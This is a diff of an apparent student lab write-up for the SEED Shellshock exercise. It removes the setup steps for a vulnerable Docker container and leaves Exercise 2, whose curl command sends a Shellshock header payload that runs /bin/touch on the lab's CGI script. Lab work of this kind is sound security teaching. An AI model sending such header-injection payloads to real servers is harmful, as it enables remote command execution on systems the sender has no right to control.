@@ -5,23 +5,6 @@
 
 # Parte A
 
-## Exercise 1
-We went to this link https://hub.docker.com/r/jsimao/seed-shellshock and on the terminal we did the command:
-
-    docker pull jsimao/seed-shellshock
-
-### Ponto a)
-After that, we ran the command below to start the docker
-    docker run -it -p 8080:80 --name seed jsimao/seed-shellshock
-
-### Ponto b)
-Run these commands below in the terminal:
-    http://localhost:8080/cgi-bin/getenv.cgi
-    http://localhost:8080/cgi-bin/vul.cgi
-
-
-----------
-
 ## Exercise 2
 ### Ponto a) 
     curl -H "ATTACK:() {echo hello; }; echo Content_type: text/plain; echo; /bin/touch /tmp/ficheiro" localhost:8080/cgi-bin/vul.cgi
